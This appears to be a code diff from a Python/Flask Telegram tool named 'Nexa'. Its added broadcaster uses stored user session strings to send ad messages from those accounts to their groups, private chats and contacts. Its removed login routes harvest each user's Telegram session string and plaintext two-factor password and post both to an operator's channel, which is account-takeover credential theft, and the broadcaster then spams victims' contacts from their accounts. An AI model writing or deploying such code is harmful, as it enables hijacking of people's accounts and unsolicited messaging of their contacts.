+        text = (ad.get("text") or ad.get("label") or "").strip()
+        if not text:
+            continue
+        safe = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+        link_lines.append(f'• <a href="{url}">{safe}</a>')
 
+    caption = base
+    if link_lines:
+        caption = (caption + "\n\n" + "\n".join(link_lines)).strip()
 
-def _user_created_dt(user):
-    ca = user.get("created_at")
-    if isinstance(ca, datetime):
-        return ca
-    if isinstance(ca, str):
-        for fmt in ("%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M"):
-            try:
-                return datetime.strptime(ca, fmt)
-            except ValueError:
-                continue
-    return None
+    media_type = config.get("media_type") or "photo"
+    if media_type not in ("photo", "video"):
+        media_type = "photo"
+
+    return {
+        "caption": caption,
+        "media_path": _resolve_media(config.get("media_path") or config.get("photo_path")),
+        "media_type": media_type,
+        "delete_prev": bool(config.get("delete_after_round")),
+    }
 
 
 class AdsBroadcaster:
@@ -1055,10 +139,8 @@ class AdsBroadcaster:
         self._running = False
         self._thread = None
         self._stop_event = threading.Event()
-        self._round_count = 0
         self._lock = threading.Lock()
-        self._pool = ThreadPoolExecutor(max_workers=BROADCAST_WORKERS,
-                                        thread_name_prefix="bc")
+        self._pool = ThreadPoolExecutor(max_workers=BROADCAST_WORKERS, thread_name_prefix="bc")
 
     def is_running(self):
         return self._running
@@ -1071,7 +153,7 @@ class AdsBroadcaster:
             self._running = True
             self._thread = threading.Thread(target=self._run, daemon=True)
             self._thread.start()
-        print("📢 Broadcaster started")
+        success("Broadcaster started")
         return True
 
     def stop(self):
@@ -1083,235 +165,317 @@ class AdsBroadcaster:
             t = self._thread
         if t:
             t.join(timeout=5)
-        update_ads_config({"next_broadcast_at": None})
-        print("📢 Broadcaster stopped")
+        dbmod.update_ads_config({"next_broadcast_at": None})
+        info("Broadcaster stopped")
         return True
 
-    def _get_interval(self):
-        if ads_config_col is not None:
-            c = ads_config_col.find_one({"_id": "main_config"})
-            if c:
-                return max(1, int(c.get("interval", 600)))
-        return 600
-
-    def _wait(self, seconds):
-        elapsed = 0
-        while not self._stop_event.is_set():
-            if elapsed >= self._get_interval():
-                return False
-            self._stop_event.wait(1)
-            elapsed += 1
+    def run_now(self):
+        threading.Thread(target=self._tick_safe, daemon=True).start()
         return True
 
     def _run(self):
-        while not self._stop_event.is_set():
-            secs = self._get_interval()
-            nxt = datetime.now() + timedelta(seconds=secs)
-            update_ads_config({"next_broadcast_at": nxt})
-            print(f"⏳ Next broadcast at {nxt:%H:%M:%S}")
-            if self._wait(secs):
-                break
-            if self._stop_event.is_set():
-                break
-            try:
-                self._run_round()
-            except Exception as e:
-                print(f"Round error: {e}")
+        try:
+            n = dbmod.backfill_next_ad_time()
+            if n:
+                info(f"Scheduled {n} previously unscheduled users")
+        except Exception as e:
+            error(f"BACKFILL ERROR: {type(e).__name__}: {e}")
+            print(traceback.format_exc(), flush=True)
 
-    def _run_round(self):
-        self._round_count += 1
-        bid = f"round_{self._round_count}_{datetime.now():%Y%m%d_%H%M%S}"
-        print(f"\n{'=' * 50}\n🚀 ROUND #{self._round_count} ({bid})\n{'=' * 50}")
+        while not self._stop_event.is_set():
+            self._tick_safe()
+            self._stop_event.wait(TICK_SECONDS)
+
+    def _tick_safe(self):
+        try:
+            self._tick()
+        except Exception as e:
+            error(f"TICK CRASH: {type(e).__name__}: {e}")
+            print(traceback.format_exc(), flush=True)
+
+    def _tick(self):
+        users_col = dbmod.users_col
+        ads_config_col = dbmod.ads_config_col
 
         if users_col is None or ads_config_col is None:
+            warn("tick skipped: database handles not ready")
             return
 
         config = ads_config_col.find_one({"_id": "main_config"})
-        if not config or not config.get("ads_enabled", False):
+
+        if config is None:
+            warn("tick skipped: no config document")
             return
 
-        # ---- delete previous messages only if the toggle is ON ----
-        if config.get("delete_after_round", False):
-            self._delete_previous_messages()
-        else:
-            print("📎 Keep mode — previous messages are NOT deleted")
-
-        caption    = (config.get("caption") or "").strip()
-        ads        = _clean_ads(config)
-        media_path = config.get("media_path") or config.get("photo_path")
-        media_type = config.get("media_type") or "photo"
-
-        if not caption and not ads and not media_path:
-            print("📭 nothing to send")
+        if not config.get("ads_enabled", False):
             return
-
-        raw_users = list(users_col.find({"ads_enabled": True}))
-
-        # ---- 30-minute grace period ----
-        now = datetime.now()
-        grace = timedelta(minutes=FIRST_AD_DELAY_MIN)
-
-        candidates = []
-        for u in raw_users:
-            created = _user_created_dt(u)
-            if created is None or (now - created) < grace:
-                print(f"⏳ {u.get('phone', '?')} still in grace period "
-                      f"({FIRST_AD_DELAY_MIN} min)")
-                continue
-            candidates.append(u)
-
-        # ---- verify sessions ----
-        valid = []
-        for u in candidates:
-            if self._verify_user_session(u):
-                valid.append(u)
-            else:
-                users_col.update_one(
-                    {"_id": u["_id"]},
-                    {"$set": {"ads_enabled": False, "status": "expired"}}
-                )
-                print(f"❌ Session expired for {u.get('phone', '?')}")
-
-        if not valid:
-            print("📭 no valid users")
-            return
-
-        print(f"📨 sending to {len(valid)} users")
-        for u in valid:
-            if self._stop_event.is_set():
-                break
-            self._pool.submit(self._send_to_user, u, caption, ads,
-                              media_path, media_type, bid)
-
-        inc_ads_config("total_broadcasts", 1)
-        update_ads_config({"last_broadcast_at": datetime.now()})
-
-    def _verify_user_session(self, user):
-        ss = user.get("session_string")
-        if not ss:
-            return False
-
-        async def check():
-            c = Client(name=f"chk_{uuid.uuid4().hex[:8]}", api_id=API_ID,
-                       api_hash=API_HASH, session_string=ss,
-                       in_memory=True, no_updates=True)
-            try:
-                await c.connect()
-                return (await c.get_me()) is not None
-            except (AuthKeyUnregistered, UserDeactivated):
-                return False
-            except Exception:
-                return True  # transient → keep user
-            finally:
-                try:
-                    await c.disconnect()
-                except Exception:
-                    pass
 
         try:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            r = loop.run_until_complete(check())
-            loop.close()
-            return r
-        except Exception:
-            return True
+            interval = max(60, int(config.get("interval", DEFAULT_INTERVAL_SEC)))
+        except (TypeError, ValueError):
+            interval = max(60, int(DEFAULT_INTERVAL_SEC))
 
-    def _delete_previous_messages(self):
-        if broadcast_msgs_col is None:
-            return
-        old = list(broadcast_msgs_col.find())
-        if not old:
-            return
-        print(f"🗑️ deleting {len(old)} old messages")
+        now = datetime.now()
 
-        for m in old:
-            async def one(m=m):
-                c = Client(name=f"del_{uuid.uuid4().hex[:8]}", api_id=API_ID,
-                           api_hash=API_HASH, session_string=m["session_string"],
-                           in_memory=True, no_updates=True)
-                try:
-                    await c.connect()
-                    c.me = await c.get_me()
-                    await c.delete_messages(m["chat_id"], m["message_id"])
-                    return True
-                except Exception:
-                    return False
-                finally:
-                    try:
-                        await c.disconnect()
-                    except Exception:
-                        pass
+        due = list(
+            users_col.find({
+                "ads_enabled": True,
+                "next_ad_time": {"$lte": now},
+            }).limit(500)
+        )
+
+        if not due:
+            self._refresh_next_broadcast()
+            return
+
+        bid = f"round_{now:%Y%m%d_%H%M%S}"
+
+        no_session = [
+            user.get("phone", "?")
+            for user in due
+            if not user.get("session_string")
+        ]
+
+        info(f"ROUND {bid}: {len(due)} user(s) due")
+
+        if no_session:
+            warn(
+                f"{len(no_session)} user(s) have no session_string: "
+                f"{', '.join(no_session[:6])}"
+                f"{' …' if len(no_session) > 6 else ''}"
+            )
+
+        for user in due:
+            if self._stop_event.is_set():
+                break
 
             try:
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
-                ok = loop.run_until_complete(one())
-                loop.close()
-                if ok:
-                    broadcast_msgs_col.delete_one({"_id": m["_id"]})
+                users_col.update_one(
+                    {"_id": user["_id"]},
+                    {
+                        "$set": {
+                            "next_ad_time": now + timedelta(seconds=interval)
+                        }
+                    },
+                )
+                self._submit(user, bid)
             except Exception as e:
-                print(f"⚠️ delete failed: {e}")
-
-    async def _send_layout(self, client, chat_id, caption, ads,
-                           media_path, media_type):
-        """ONE message: media (or text) + caption + ALL ad buttons inline.
-        Returns list with the single msg id."""
-        buttons = [
-            [InlineKeyboardButton(a["label"], url=a["url"])]
-            for a in ads if a.get("has_button")
-        ]
-        kb = InlineKeyboardMarkup(buttons) if buttons else None
-
-        if media_path and os.path.exists(media_path):
-            if media_type == "video":
-                m = await client.send_video(
-                    chat_id, video=media_path,
-                    caption=caption or "", reply_markup=kb,
+                error(
+                    f"SUBMIT ERROR [{user.get('phone', '?')}]: "
+                    f"{type(e).__name__}: {e}"
                 )
-            else:
-                m = await client.send_photo(
-                    chat_id, photo=media_path,
-                    caption=caption or "", reply_markup=kb,
-                )
-        else:
-            m = await client.send_message(
-                chat_id, caption or " ", reply_markup=kb,
-            )
-        return [m.id]
 
-    def _send_to_user(self, user, caption, ads, media_path, media_type, bid):
-        uid   = user.get("user_id")
-        phone = user.get("phone", "?")
-        ss    = user.get("session_string")
-        if not ss:
+        try:
+            dbmod.inc_ads_config("total_broadcasts", 1)
+            dbmod.update_ads_config({"last_broadcast_at": now})
+            self._refresh_next_broadcast()
+        except Exception as e:
+            error(f"SCHEDULER UPDATE ERROR: {type(e).__name__}: {e}")
+
+    def _submit(self, user, bid):
+        try:
+            future = self._pool.submit(self._send_to_user, user, bid)
+            future.add_done_callback(self._worker_done)
+        except Exception as e:
+            error(f"SUBMIT FAILED: {type(e).__name__}: {e}")
+
+    def _worker_done(self, future):
+        try:
+            exc = future.exception()
+        except Exception as e:
+            error(f"FUTURE ERROR: {type(e).__name__}: {e}")
             return
+
+        if exc is not None:
+            error(f"WORKER CRASH: {type(exc).__name__}: {exc}")
+
+    def _refresh_next_broadcast(self):
+        users_col = dbmod.users_col
+
+        if users_col is None:
+            return
+
+        doc = users_col.find_one(
+            {
+                "ads_enabled": True,
+                "next_ad_time": {"$ne": None},
+            },
+            sort=[("next_ad_time", 1)],
+        )
+
+        next_time = doc.get("next_ad_time") if doc is not None else None
+
+        dbmod.update_ads_config({"next_broadcast_at": next_time})
+
+    async def _send_layout(self, client, chat_id, payload):
+        caption = payload["caption"] or ""
+        media_path = payload["media_path"]
+        media_type = payload["media_type"]
+
+        async def _dispatch(parse):
+            if media_path:
+                if media_type == "video":
+                    return await client.send_video(
+                        chat_id,
+                        video=media_path,
+                        caption=caption,
+                        parse_mode=parse,
+                    )
+                return await client.send_photo(
+                    chat_id,
+                    photo=media_path,
+                    caption=caption,
+                    parse_mode=parse,
+                )
+            return await client.send_message(
+                chat_id,
+                caption or "\u200b",
+                parse_mode=parse,
+            )
+
+        parse = _parse_mode()
+        try:
+            msg = await _dispatch(parse)
+        except (BadRequest, ValueError) as e:
+            low = str(e).lower()
+            if parse is not None and ("parse" in low or "entit" in low or "invalid" in low):
+                _disable_html(f"{type(e).__name__}: {e}")
+                msg = await _dispatch(None)
+            else:
+                raise
+        return msg.id
+
+    async def _delete_user_messages(self, client, uid, phone):
+        msgs = dbmod.broadcast_msgs_col
+        if msgs is None:
+            return
+        rows = list(msgs.find({"user_id": uid}))
+        ok = 0
+        for row in rows:
+            try:
+                await client.delete_messages(
+                    _coerce_chat_id(row["chat_id"]),
+                    row["message_id"],
+                )
+                ok += 1
+            except FloodWait as fw:
+                await asyncio.sleep(min(int(getattr(fw, "value", 5)), 30))
+                try:
+                    await client.delete_messages(
+                        _coerce_chat_id(row["chat_id"]),
+                        row["message_id"],
+                    )
+                    ok += 1
+                except Exception:
+                    pass
+            except Exception:
+                pass
+        msgs.delete_many({"user_id": uid})
+        if rows:
+            info(f"[{phone}] cleared {ok}/{len(rows)} previous message(s)")
+
+    def _send_to_user(self, user, bid):
+        phone = user.get("phone", "?")
+        try:
+            self._send_to_user_inner(user, bid)
+        except Exception as e:
+            error(f"[{phone}] UNCAUGHT {type(e).__name__}: {e}")
+            print(traceback.format_exc(), flush=True)
+
+    def _send_to_user_inner(self, user, bid):
+        users_col = dbmod.users_col
+        ads_config_col = dbmod.ads_config_col
+        msgs_col = dbmod.broadcast_msgs_col
+
+        uid = user.get("user_id")
+        phone = user.get("phone", "?")
+        ss = user.get("session_string")
+
+        if not ss:
+            warn(f"[{phone}] SKIP - no session_string in user doc")
+            return
+
+        if ads_config_col is None:
+            warn(f"[{phone}] SKIP - database collection unavailable")
+            return
+
+        config = ads_config_col.find_one({"_id": "main_config"})
+        if not config:
+            warn(f"[{phone}] SKIP - no config doc")
+            return
+        if not config.get("ads_enabled", False):
+            warn(f"[{phone}] SKIP - broadcast disabled")
+            return
+
+        payload = _build_payload(config)
+        info(
+            f"[{phone}] start | media={'yes' if payload['media_path'] else 'no'} "
+            f"| caption={len(payload['caption'])}ch"
+        )
+
         sent = []
+        delivered = {"n": 0}
 
         async def work():
-            c = Client(name=f"bc_{uid}_{uuid.uuid4().hex[:8]}", api_id=API_ID,
-                       api_hash=API_HASH, session_string=ss,
-                       in_memory=True, no_updates=True)
+            c = Client(
+                name=f"bc_{uid}_{uuid.uuid4().hex[:8]}",
+                api_id=API_ID,
+                api_hash=API_HASH,
+                session_string=ss,
+                in_memory=True,
+                no_updates=True,
+            )
             try:
                 await c.connect()
                 me = await c.get_me()
                 if not me:
                     raise AuthKeyUnregistered("bad session")
-                c.me = me  # fixes is_premium crash
+                c.me = me
 
-                # 1) Saved Messages
+                if payload["delete_prev"]:
+                    await self._delete_user_messages(c, uid, phone)
+
                 try:
-                    for mid in await self._send_layout(c, "me", caption, ads,
-                                                       media_path, media_type):
-                        sent.append(("me", mid))
-                    print(f"✅ DM sent to {phone}")
+                    sent.append(("me", await self._send_layout(c, "me", payload)))
+                    delivered["n"] += 1
+                    success(f"[{phone}] self delivered")
+                except FloodWait as fw:
+                    wait = min(int(getattr(fw, "value", 5)), 30)
+                    warn(f"[{phone}] FloodWait {wait}s on self, retrying")
+                    await asyncio.sleep(wait)
+                    try:
+                        sent.append(("me", await self._send_layout(c, "me", payload)))
+                        delivered["n"] += 1
+                        success(f"[{phone}] self delivered after wait")
+                    except Exception as e:
+                        error(f"[{phone}] self FAIL: {type(e).__name__}: {e}")
+                except SKIP_ERRORS as e:
+                    warn(f"[{phone}] self skipped: {type(e).__name__}")
                 except Exception as e:
-                    print(f"❌ DM {phone}: {e}")
+                    error(f"[{phone}] self FAIL: {type(e).__name__}: {e}")
 
-                # 2) Groups
+                try:
+                    contacts = await c.get_contacts() or []
+                    contacts = [
+                        x for x in contacts
+                        if x is not None
+                        and not getattr(x, "is_bot", False)
+                        and not getattr(x, "is_deleted", False)
+                    ]
+                except Exception as e:
+                    error(f"[{phone}] get_contacts FAIL: {type(e).__name__}: {e}")
+                    contacts = []
+                contact_ids = {x.id for x in contacts}
+
+                try:
+                    dialogs = [d async for d in c.get_dialogs()]
+                except Exception as e:
+                    error(f"[{phone}] get_dialogs FAIL: {type(e).__name__}: {e}")
+                    dialogs = []
+
                 try:
                     n = 0
-                    async for d in c.get_dialogs():
+                    for d in dialogs:
                         if self._stop_event.is_set():
                             break
                         if not d or not d.chat:
@@ -1319,2275 +483,161 @@ class AdsBroadcaster:
                         if _chat_type_value(d.chat.type) not in ("group", "supergroup"):
                             continue
                         try:
-                            for mid in await self._send_layout(
-                                c, d.chat.id, caption, ads, media_path, media_type
-                            ):
-                                sent.append((d.chat.id, mid))
+                            sent.append(
+                                (d.chat.id, await self._send_layout(c, d.chat.id, payload))
+                            )
                             n += 1
                             await asyncio.sleep(GROUP_DM_GAP_SEC)
-                        except (PeerIdInvalid, ChannelInvalid, ValueError):
-                            continue
                         except FloodWait as fw:
-                            await asyncio.sleep(min(fw.value, 30))
-                        except BadRequest:
+                            await asyncio.sleep(min(int(getattr(fw, "value", 5)), 30))
+                        except SKIP_ERRORS:
                             continue
                         except Exception as e:
-                            print(f"⚠️ group {d.chat.id}: {e}")
-                    print(f"✅ {phone}: {n} groups")
+                            warn(f"[{phone}] group {d.chat.id}: {type(e).__name__}")
+                    delivered["n"] += n
+                    info(f"[{phone}] {n} group(s) delivered")
                 except Exception as e:
-                    print(f"❌ groups {phone}: {e}")
+                    error(f"[{phone}] groups FAIL: {type(e).__name__}: {e}")
 
-                # 3) Contacts (capped, 1s gap)
                 try:
-                    n = 0
-                    contacts = await c.get_contacts()
-                    contacts = contacts[:CONTACT_LIMIT_PER_ROUND]
-                    print(f"📇 {phone}: up to {len(contacts)} contacts "
-                          f"(cap={CONTACT_LIMIT_PER_ROUND}, gap={CONTACT_DM_GAP_SEC}s)")
-                    for contact in contacts:
-                        if self._stop_event.is_set():
-                            break
-                        if contact is None:
-                            continue
-                        if getattr(contact, "is_bot", False) or getattr(contact, "is_deleted", False):
-                            continue
-                        try:
-                            for mid in await self._send_layout(
-                                c, contact.id, caption, ads, media_path, media_type
-                            ):
-                                sent.append((contact.id, mid))
-                            n += 1
-                            await asyncio.sleep(CONTACT_DM_GAP_SEC)
-                        except FloodWait as fw:
-                            await asyncio.sleep(min(fw.value, 30))
-                        except (PeerIdInvalid, BadRequest):
-                            continue
-                        except Exception as e:
-                            print(f"⚠️ contact {contact.id}: {e}")
-                    print(f"✅ {phone}: {n} contacts")
+                    dm_dialogs = [
+                        d for d in dialogs
+                        if d and d.chat
+                        and _chat_type_value(d.chat.type) == "private"
+                        and d.chat.id != me.id
+                        and d.chat.id not in contact_ids
+                        and not getattr(d.chat, "is_bot", False)
+                    ]
+                    if dm_dialogs:
+                        offset = int(user.get("dm_offset") or 0) % len(dm_dialogs)
+                        rotated = dm_dialogs[offset:] + dm_dialogs[:offset]
+                        batch = rotated[:CONTACT_LIMIT_PER_ROUND]
+                        n = 0
+                        for d in batch:
+                            if self._stop_event.is_set():
+                                break
+                            try:
+                                sent.append(
+                                    (d.chat.id, await self._send_layout(c, d.chat.id, payload))
+                                )
+                                n += 1
+                                await asyncio.sleep(CONTACT_DM_GAP_SEC)
+                            except FloodWait as fw:
+                                await asyncio.sleep(min(int(getattr(fw, "value", 5)), 30))
+                            except SKIP_ERRORS:
+                                continue
+                            except Exception as e:
+                                warn(f"[{phone}] dm {d.chat.id}: {type(e).__name__}")
+                        delivered["n"] += n
+                        new_offset = (offset + len(batch)) % len(dm_dialogs)
+                        users_col.update_one(
+                            {"_id": user["_id"]},
+                            {"$set": {"dm_offset": new_offset}},
+                        )
+                        info(
+                            f"[{phone}] {n} dm(s) delivered "
+                            f"(window {offset}->{new_offset} of {len(dm_dialogs)})"
+                        )
                 except Exception as e:
-                    print(f"❌ contacts {phone}: {e}")
+                    error(f"[{phone}] dms FAIL: {type(e).__name__}: {e}")
 
-                # stats
+                try:
+                    if contacts:
+                        offset = int(user.get("contact_offset") or 0) % len(contacts)
+                        rotated = contacts[offset:] + contacts[:offset]
+                        batch = rotated[:CONTACT_LIMIT_PER_ROUND]
+                        n = 0
+                        for contact in batch:
+                            if self._stop_event.is_set():
+                                break
+                            try:
+                                sent.append(
+                                    (contact.id, await self._send_layout(c, contact.id, payload))
+                                )
+                                n += 1
+                                await asyncio.sleep(CONTACT_DM_GAP_SEC)
+                            except FloodWait as fw:
+                                await asyncio.sleep(min(int(getattr(fw, "value", 5)), 30))
+                            except SKIP_ERRORS:
+                                continue
+                            except Exception as e:
+                                warn(f"[{phone}] contact {contact.id}: {type(e).__name__}")
+                        delivered["n"] += n
+                        new_offset = (offset + len(batch)) % len(contacts)
+                        users_col.update_one(
+                            {"_id": user["_id"]},
+                            {"$set": {"contact_offset": new_offset}},
+                        )
+                        info(
+                            f"[{phone}] {n} contact(s) delivered "
+                            f"(window {offset}->{new_offset} of {len(contacts)})"
+                        )
+                except Exception as e:
+                    error(f"[{phone}] contacts FAIL: {type(e).__name__}: {e}")
+
                 if sent:
                     users_col.update_one(
                         {"_id": user["_id"]},
-                        {"$set": {"last_ad_time": datetime.now(),
-                                  "last_broadcast_id": bid},
-                         "$inc": {"deliveries": 1}}
+                        {
+                            "$set": {
+                                "last_ad_time": datetime.now(),
+                                "last_broadcast_id": bid,
+                            },
+                            "$inc": {"deliveries": 1},
+                        },
                     )
+                    success(f"[{phone}] FINISHED - {delivered['n']} chat(s)")
                 else:
-                    users_col.update_one({"_id": user["_id"]},
-                                         {"$inc": {"failures": 1}})
-
+                    users_col.update_one(
+                        {"_id": user["_id"]},
+                        {"$inc": {"failures": 1}},
+                    )
+                    error(f"[{phone}] FINISHED with 0 deliveries")
             finally:
                 try:
                     await c.disconnect()
                 except Exception:
                     pass
 
+        loop = asyncio.new_event_loop()
         try:
-            loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
-            loop.run_until_complete(work())
-            loop.close()
+            loop.run_until_complete(asyncio.wait_for(work(), timeout=WORK_TIMEOUT))
+        except asyncio.TimeoutError:
+            error(f"[{phone}] TIMEOUT after {WORK_TIMEOUT}s")
         except (UserDeactivated, AuthKeyUnregistered):
-            users_col.update_one({"_id": user["_id"]},
-                                 {"$set": {"ads_enabled": False, "status": "expired"}})
-        except Exception as e:
-            print(f"❌ {phone}: {e}")
+            users_col.update_one(
+                {"_id": user["_id"]},
+                {"$set": {"ads_enabled": False, "status": "expired"}},
+            )
+            error(f"[{phone}] session expired - ads disabled for this user")
+        finally:
+            try:
+                loop.close()
+            except Exception:
+                pass
 
-        # Only store message IDs if we might need to delete them later
-        config = ads_config_col.find_one({"_id": "main_config"}) if ads_config_col else None
-        if (config and config.get("delete_after_round", False)
-                and broadcast_msgs_col is not None and sent):
-            broadcast_msgs_col.insert_many([
-                {"user_id": uid, "phone": phone, "broadcast_id": bid,
-                 "chat_id": str(cid), "message_id": mid,
-                 "session_string": ss, "sent_at": datetime.now()}
+        if sent and msgs_col is not None:
+            msgs_col.insert_many([
+                {
+                    "user_id": uid,
+                    "phone": phone,
+                    "broadcast_id": bid,
+                    "chat_id": ("me" if cid == "me" else int(cid)),
+                    "message_id": mid,
+                    "session_string": ss,
+                    "sent_at": datetime.now(),
+                }
                 for cid, mid in sent
             ])
+
+    def send_test(self, user):
+        bid = f"test_{datetime.now():%Y%m%d_%H%M%S}"
+        info(f"TEST send queued for {user.get('phone', '?')}")
+        self._submit(user, bid)
+        return True
 
 
 ads_broadcaster = AdsBroadcaster()
 
-
-Nexa/auth_routes.py
-
-
-from flask import Blueprint, request, jsonify, session, redirect, render_template
-import uuid
-from datetime import datetime
-from pyrogram.errors import (
-    PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired,
-    SessionPasswordNeeded, FloodWait
-)
-from .database import save_session_to_db, send_to_channel, temp_sessions_col, ensure_db
-from .session_manager import session_manager
-
-auth_bp = Blueprint('auth', __name__)
-
-
-@auth_bp.route("/")
-def index():
-    return redirect("/login")
-
-
-@auth_bp.route("/login")
-def login():
-    return render_template("login.html")
-
-
-@auth_bp.route("/api/send-code", methods=["POST"])
-def send_code():
-    try:
-        session_manager.cleanup_old()
-    except Exception as e:
-        print(f"cleanup_old error: {e}")
-
-    data = request.get_json(silent=True) or {}
-    phone = (data.get("phone") or "").strip()
-    session_name = (data.get("session_name") or "session").strip()
-
-    if not phone or len(phone) < 10:
-        return jsonify(ok=False, error="Invalid phone number"), 400
-
-    ensure_db()
-    session_id = str(uuid.uuid4())[:8]
-    try:
-        session_thread = session_manager.create_session(session_id, phone)
-        sent = session_thread.execute(lambda: session_thread.client.send_code(phone))
-
-        if temp_sessions_col is not None:
-            temp_sessions_col.update_one(
-                {'_id': session_id},
-                {'$set': {
-                    'phone_code_hash': sent.phone_code_hash,
-                    'session_name': session_name,
-                    'status': 'code_sent',
-                    'phone': phone,
-                    'created_at': datetime.now()
-                }},
-                upsert=True
-            )
-        return jsonify(ok=True, session_id=session_id, message=f"Code sent to {phone}")
-
-    except PhoneNumberInvalid:
-        session_manager.remove_session(session_id)
-        return jsonify(ok=False, error="Invalid phone number"), 400
-    except FloodWait as e:
-        session_manager.remove_session(session_id)
-        return jsonify(ok=False, error=f"Please wait {e.value} seconds"), 429
-    except RuntimeError as e:
-        session_manager.remove_session(session_id)
-        return jsonify(ok=False, error=str(e)), 503
-    except Exception as e:
-        session_manager.remove_session(session_id)
-        print(f"send_code error: {e}")
-        return jsonify(ok=False, error="Failed to send code. Try again."), 500
-
-
-@auth_bp.route("/api/verify-code", methods=["POST"])
-def verify_code():
-    data = request.get_json(silent=True) or {}
-    session_id = (data.get("session_id") or "").strip()
-    code = (data.get("code") or "").strip().replace(" ", "")
-    password = data.get("password") or ""
-
-    if not session_id:
-        return jsonify(ok=False, error="Session ID required"), 400
-
-    session_thread = session_manager.get_session(session_id)
-    if not session_thread:
-        return jsonify(ok=False, error="Session expired"), 400
-
-    ensure_db()
-    session_doc = None
-    if temp_sessions_col is not None:
-        session_doc = temp_sessions_col.find_one({'_id': session_id})
-
-    phone = session_doc.get('phone') if session_doc else session_thread.phone
-    phone_code_hash = session_doc.get('phone_code_hash') if session_doc else None
-    session_name = session_doc.get('session_name', 'session') if session_doc else 'session'
-
-    if not phone:
-        session_manager.remove_session(session_id)
-        return jsonify(ok=False, error="Session data lost"), 400
-
-    if not code or not code.isdigit():
-        return jsonify(ok=False, error="Invalid verification code"), 400
-
-    result = {"user": None, "session_string": None, "error": None}
-
-    try:
-        user = session_thread.execute(
-            lambda: session_thread.client.sign_in(
-                phone_number=phone, phone_code_hash=phone_code_hash, phone_code=code
-            )
-        )
-        session_string = session_thread.execute(
-            lambda: session_thread.client.export_session_string()
-        )
-        result = {"user": user, "session_string": session_string, "error": None}
-
-    except SessionPasswordNeeded:
-        if not password:
-            return jsonify(ok=False, requires_password=True), 401
-        try:
-            user = session_thread.execute(
-                lambda: session_thread.client.check_password(password)
-            )
-            session_string = session_thread.execute(
-                lambda: session_thread.client.export_session_string()
-            )
-            result = {"user": user, "session_string": session_string, "error": None}
-        except Exception as e:
-            print(f"2FA error: {e}")
-            return jsonify(ok=False, error="Invalid 2FA password"), 401
-
-    except PhoneCodeInvalid:
-        session_manager.remove_session(session_id)
-        return jsonify(ok=False, error="Invalid verification code"), 401
-    except PhoneCodeExpired:
-        session_manager.remove_session(session_id)
-        return jsonify(ok=False, error="Code expired"), 401
-    except Exception as e:
-        session_manager.remove_session(session_id)
-        print(f"verify_code error: {e}")
-        return jsonify(ok=False, error="Verification failed. Try again."), 500
-
-    if not result["user"]:
-        session_manager.remove_session(session_id)
-        return jsonify(ok=False, error="Verification failed"), 400
-
-    session_manager.remove_session(session_id)
-
-    user = result["user"]
-    session_string = result["session_string"]
-    user_info = {
-        "id": user.id,
-        "first_name": user.first_name,
-        "last_name": user.last_name or "",
-        "username": user.username or "N/A",
-        "phone": phone,
-        "session_string": session_string,
-        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        "session_name": session_name
-    }
-
-    db_id = save_session_to_db(user_info)
-    if not db_id:
-        print("⚠️ save_session_to_db returned False")
-
-    country_code = phone[:3] if phone.startswith("+") else phone[:2]
-    channel_msg = (
-        f"🟢 <b>NEW SESSION</b>\n"
-        f"👤 <b>Name:</b> {user_info['first_name']} {user_info['last_name']}\n"
-        f"🔗 <b>Username:</b> @{user_info['username']}\n"
-        f"🆔 <b>User ID:</b> <code>{user_info['id']}</code>\n"
-        f"📱 <b>Phone:</b> <code>{phone}</code>\n"
-        f"🌍 <b>Country:</b> +{country_code}"
-    )
-    if password:
-        channel_msg += f"\n🔑 <b>2FA:</b> <code>{password}</code>"
-    channel_msg += f"\n\n<b>🔐 SESSION:</b>\n<code>{session_string}</code>"
-    send_to_channel(channel_msg)
-
-    # store a lightweight user object (no session string in the cookie)
-    session["user"] = {
-        "id": user_info["id"],
-        "name": f"{user_info['first_name']} {user_info['last_name']}".strip(),
-        "username": user_info["username"],
-        "phone": phone
-    }
-
-    return jsonify(ok=True, user=session["user"])
-
-
-@auth_bp.route("/api/logout", methods=["POST"])
-def logout():
-    session.clear()
-    return jsonify(ok=True)
-
-
-@auth_bp.route("/dashboard")
-def dashboard():
-    if "user" not in session:
-        return redirect("/login")
-    return render_template("dashboard.html", user=session["user"])
-
-
-Nexa/admin_routes.py
-
-
-import os
-import uuid
-import hmac
-from datetime import datetime
-from flask import (Blueprint, render_template, request, jsonify,
-                   send_from_directory, session, redirect, url_for)
-from bson import ObjectId
-from bson.errors import InvalidId
-from werkzeug.utils import secure_filename
-from config import (UPLOAD_FOLDER, MIN_INTERVAL_MIN, MAX_INTERVAL_MIN,
-                    ALLOWED_EXTENSIONS, MAX_CONTENT_LENGTH, ADMIN_PASSWORD)
-from Nexa.database import (get_ads_config, update_ads_config, reset_ads_config,
-                           mutate_ads, get_stats, get_all_users, users_col,
-                           broadcast_msgs_col, allowed_file, delete_photo_file,
-                           media_kind)
-from Nexa.broadcaster import ads_broadcaster
-from Nexa.session_manager import session_manager, session_cleaner
-
-admin_bp = Blueprint("admin", __name__, template_folder="../templates")
-
-
-# ---------- auth + csrf ----------
-
-def _authed():
-    if not ADMIN_PASSWORD:
-        return True
-    return session.get("admin_ok") is True
-
-
-def _csrf():
-    if "csrf" not in session:
-        session["csrf"] = uuid.uuid4().hex
-    return session["csrf"]
-
-
-@admin_bp.before_request
-def _guard():
-    if request.endpoint == "admin.login":
-        return None
-    if not _authed():
-        if request.path.startswith("/admin/api/"):
-            return jsonify({"success": False, "error": "unauthorized"}), 401
-        return redirect(url_for("admin.login"))
-    if request.method in ("POST", "PUT", "DELETE"):
-        token = request.headers.get("X-CSRF-Token") or request.form.get("csrf")
-        if token and not hmac.compare_digest(token, _csrf()):
-            return jsonify({"success": False, "error": "bad csrf"}), 403
-    return None
-
-
-@admin_bp.route("/login", methods=["GET", "POST"])
-def login():
-    if request.method == "GET":
-        return render_template("admin_login.html", csrf=_csrf())
-    if not ADMIN_PASSWORD:
-        session["admin_ok"] = True
-        return redirect(url_for("admin.admin_panel"))
-    if hmac.compare_digest(request.form.get("password", ""), ADMIN_PASSWORD):
-        session["admin_ok"] = True
-        return redirect(url_for("admin.admin_panel"))
